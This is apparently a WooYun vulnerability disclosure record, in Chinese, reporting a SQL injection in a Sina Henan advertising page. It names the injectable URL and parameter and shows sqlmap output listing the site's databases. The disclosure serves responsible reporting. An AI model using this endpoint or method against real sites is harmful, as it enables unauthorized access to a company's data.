wybug_detail:
漏洞详情 披露状态：   									2015-08-23：	细节已通知厂商并且等待厂商处理中									2015-08-24：	厂商已经确认，细节仅向厂商公开									2015-09-03：	细节向核心白帽子及相关领域专家公开									2015-09-13：	细节向普通白帽子公开									2015-09-23：	细节向实习白帽子公开									2015-10-08：	细节向公众公开  简要描述： 新浪广告某站SQL注入 详细说明：  http://ad.henan.sina.com.cn/acer2010/js/vote_js.php?p_id=1注入原理同  WooYun: 新浪某接口SQL注入漏洞   漏洞证明：  
---[07:48:48] [INFO] the back-end DBMS is MySQLweb application technology: Apacheback-end DBMS: MySQL 5[07:48:48] [INFO] fetching database names[07:48:48] [INFO] fetching number of databases[07:48:48] [WARNING] time-based comparison requires larger statistical model, please wait..............................                                                                                                                    [07:48:50] [WARNING] it is very important not to stress the network adapter during usage of time-based payloads to prevent potential errors do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y[07:49:03] [INFO] adjusting time delay to 1 second due to good response times3[07:49:03] [INFO] retrieved: information_schema[07:53:43] [INFO] retrieved: adhenan[07:55:20] [INFO] retrieved: testavailable databases [3]:[*] adhenan[*] information_schema[*] test
